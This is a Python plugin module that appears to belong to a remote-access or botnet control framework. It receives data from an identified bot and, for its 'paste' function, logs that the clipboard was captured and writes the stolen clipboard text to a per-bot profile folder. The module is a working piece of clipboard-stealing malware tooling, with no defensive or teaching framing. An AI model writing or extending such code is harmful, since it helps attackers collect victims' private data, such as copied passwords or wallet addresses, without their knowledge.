from secrets import token_urlsafe
from utils.UI import debug
from utils.sys_utils import bytes_convert

from conf import global_conf

profile = '{}/{}'.format(global_conf.databases['database'], global_conf.databases['profiles'])

def main(result, log, bot_id, function):

    function = str(function).lower()

    if (function in ['copy', 'paste']):

        if (function == 'copy'):

            log.logger('¡Datos copiados correctamente!', debug.INF)

        else:

            text = str(result) 
            clipboard_name = '{}/{}/{}.clipboard.txt'.format(profile, bot_id, token_urlsafe(32))

            log.logger('¡Portapapeles capturado! ...', debug.INF)
            log.logger('Guardando (%d) ...' % (len(text)), debug.WAR)

            with open(clipboard_name, 'wb') as file_object:

                file_object.write(bytes_convert.convert(text))

            log.logger('Portapales guardado: {}'.format(clipboard_name), debug.PER)

    else:

        log.logger('{}, No es una función válida para este complemento'.format(function), debug.WAR)
